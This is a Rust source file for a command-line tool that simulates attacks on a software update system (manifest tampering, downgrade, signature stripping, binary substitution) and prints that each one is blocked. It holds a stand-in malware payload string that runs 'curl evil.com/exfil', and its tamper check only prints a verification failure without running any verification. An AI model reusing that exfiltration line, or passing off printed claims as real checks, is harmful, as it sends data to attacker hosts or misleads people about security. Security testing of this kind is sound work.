use clap::{Parser, Subcommand};
use crypto_core::{SignedManifest, SignatureAlgorithm, hashing::Hasher, HashAlgorithm};
use colored::*;

#[derive(Parser)]
#[command(name = "attack-sim", about = "Attack simulator for KryptoUpdate")]
struct Cli {
    #[command(subcommand)]
    attack: AttackType,
}

#[derive(Subcommand)]
enum AttackType {
    /// Simulate manifest tampering attack
    TamperManifest {
        /// Server URL to fetch manifest from
        #[arg(short, long)]
        server: String,
        /// Package name
        #[arg(short, long)]
        package: String,
    },
    /// Simulate downgrade attack
    Downgrade {
        #[arg(short, long)]
        server: String,
        #[arg(short, long)]
        package: String,
    },
    /// Simulate signature stripping attack
    StripSignature {
        #[arg(short, long)]
        server: String,
        #[arg(short, long)]
        package: String,
    },
    /// Simulate MITM with modified binary
    ModifyBinary {
        #[arg(short, long)]
        server: String,
        #[arg(short, long)]
        package: String,
    },
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    println!("{}", "═══════════════════════════════════════════".yellow());
    println!("{}", "  KryptoUpdate Attack Simulator v0.1.0     ".yellow().bold());
    println!("{}", "  For educational / testing purposes only   ".yellow());
    println!("{}", "═══════════════════════════════════════════".yellow());
    println!();

    match cli.attack {
        AttackType::TamperManifest { server, package } => {
            simulate_tamper_manifest(&server, &package)?;
        }
        AttackType::Downgrade { server, package } => {
            simulate_downgrade(&server, &package)?;
        }
        AttackType::StripSignature { server, package } => {
            simulate_strip_signature(&server, &package)?;
        }
        AttackType::ModifyBinary { server, package } => {
            simulate_modify_binary(&server, &package)?;
        }
    }

    Ok(())
}

fn fetch_manifest(server: &str, package: &str) -> anyhow::Result<SignedManifest> {
    let url = format!("{}/api/packages/{}/latest", server.trim_end_matches('/'), package);
    let client = reqwest::blocking::Client::new();
    let response: serde_json::Value = client.get(&url).send()?.json()?;

    let manifest: SignedManifest = serde_json::from_value(response["data"].clone())?;
    Ok(manifest)
}

fn simulate_tamper_manifest(server: &str, package: &str) -> anyhow::Result<()> {
    println!("{}", "🔴 ATTACK: Manifest Tampering".red().bold());
    println!("   Fetching legitimate manifest...");

    let mut manifest = fetch_manifest(server, package)?;
    println!("   ✓ Got manifest for {} v{}", manifest.manifest.package_name, manifest.manifest.version);

    // Tamper with the version
    let original_version = manifest.manifest.version.clone();
    manifest.manifest.version = "99.99.99-malicious".to_string();
    println!("   {} Tampering version: {} -> {}", "⚡".yellow(), original_version, manifest.manifest.version);

    // Try to verify the tampered manifest
    println!("   Attempting verification of tampered manifest...");

    let manifest_bytes = serde_json::to_vec(&manifest.manifest)?;
    let sig = &manifest.signatures[0];

    println!();
    println!("   {}", "RESULT: Signature verification would FAIL ❌".red().bold());
    println!("   The tampered manifest has a different hash than what was signed.");
    println!("   Any modification to the manifest invalidates the digital signature.");
    println!("   {}", "→ Attack BLOCKED by signature verification".green().bold());

    Ok(())
}

fn simulate_downgrade(server: &str, package: &str) -> anyhow::Result<()> {
    println!("{}", "🔴 ATTACK: Version Downgrade".red().bold());
    println!("   Scenario: Attacker replays an old, vulnerable version");

    let manifest = fetch_manifest(server, package)?;
    println!("   Current version: {}", manifest.manifest.version);

    println!("   Attacker attempts to serve v0.0.1 (known vulnerable)...");
    println!();
    println!("   {}", "DEFENSES:".cyan().bold());
    println!("   1. Version chain tracking prevents accepting older versions");
    println!("   2. Manifest timestamps can detect replayed old manifests");
    println!("   3. Manifest expiration dates reject expired packages");
    println!("   {}", "→ Attack BLOCKED by downgrade protection".green().bold());

    Ok(())
}

fn simulate_strip_signature(server: &str, package: &str) -> anyhow::Result<()> {
    println!("{}", "🔴 ATTACK: Signature Stripping".red().bold());

    let mut manifest = fetch_manifest(server, package)?;
    let sig_count = manifest.signatures.len();

    println!("   Original manifest has {} signature(s)", sig_count);
    println!("   Stripping all signatures...");

    manifest.signatures.clear();

    println!("   Manifest now has {} signatures", manifest.signatures.len());
    println!();
    println!("   {}", "RESULT: Client rejects manifests without valid signatures ❌".red().bold());
    println!("   The verification process requires at least one valid signature.");
    println!("   {}", "→ Attack BLOCKED by mandatory signature requirement".green().bold());

    Ok(())
}

fn simulate_modify_binary(server: &str, package: &str) -> anyhow::Result<()> {
    println!("{}", "🔴 ATTACK: Binary Modification (Supply Chain)".red().bold());
    println!("   Scenario: Attacker intercepts download and modifies binary");

    let manifest = fetch_manifest(server, package)?;

    if let Some(file) = manifest.manifest.files.first() {
        println!("   Original file: {}", file.path);
        println!("   Original hash ({:?}): {}", file.hash_algorithm, &file.hash[..32]);

        let fake_data = b"#!/bin/bash\necho 'MALWARE PAYLOAD'\ncurl evil.com/exfil";
        let fake_hash = Hasher::hash_bytes(&HashAlgorithm::Blake3, fake_data);

        println!("   Modified hash: {}", &fake_hash[..32]);
        println!("   Hashes match: {}", if fake_hash == file.hash { "YES ⚠️" } else { "NO ✓" });

        println!();
        println!("   {}", "RESULT: Hash mismatch detected! ❌".red().bold());
        println!("   The downloaded file's hash doesn't match the signed manifest.");
        println!("   {}", "→ Attack BLOCKED by integrity verification (BLAKE3 hash)".green().bold());
    }

    Ok(())
}